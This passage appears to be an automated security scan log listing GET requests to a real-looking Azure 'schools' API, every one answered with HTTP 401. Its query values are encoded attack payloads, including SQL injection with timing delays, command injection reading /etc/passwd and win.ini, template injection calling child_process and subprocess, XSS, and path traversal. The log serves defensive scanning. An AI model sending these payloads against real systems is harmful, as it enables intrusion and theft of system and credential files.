* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+AND+%25271%2527%253D%25272%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+OR+%25271%2527%253D%25271%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+UNION+ALL+select+NULL+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2529+UNION+ALL+select+NULL+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%253B&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%253Bcat+%252Fetc%252Fpasswd%253B&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%253Bget-help&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%253Bget-help+%2523&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%253Bsleep+15.0%253B&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%253Bstart-sleep+-s+15.0&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%253Bstart-sleep+-s+15.0+%2523&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%257Ctimeout+%252FT+15.0&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522%252Bresponse.write%2528345%252C117*633%252C582%2529%252B%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522%252F%253E%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2522java.lang.Thread.sleep%2522%252815000%2529&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2523%257B%2525x%2528sleep+15%2529%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2527%2528&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%252F%252F980414377652208366.owasp.org&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%252F&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%252Fetc%252Fpasswd&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%252Fschools&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%252FWEB-INF%252Fweb.xml&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253B&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253C%2521--&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253C&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253Cscript%253Ealert(1&29%253C/script%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%255Cschools&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%255CWEB-INF%255Cweb.xml&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%255D%255D%253E&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=%257Bsystem%2528%2522sleep+15%2522%2529%257D&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=0W45pz4p&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%2526cat+%252Fetc%252Fpasswd%2526%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%2526sleep+15.0%2526%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%2526timeout+%252FT+15.0%2526%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%253Bget-help&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
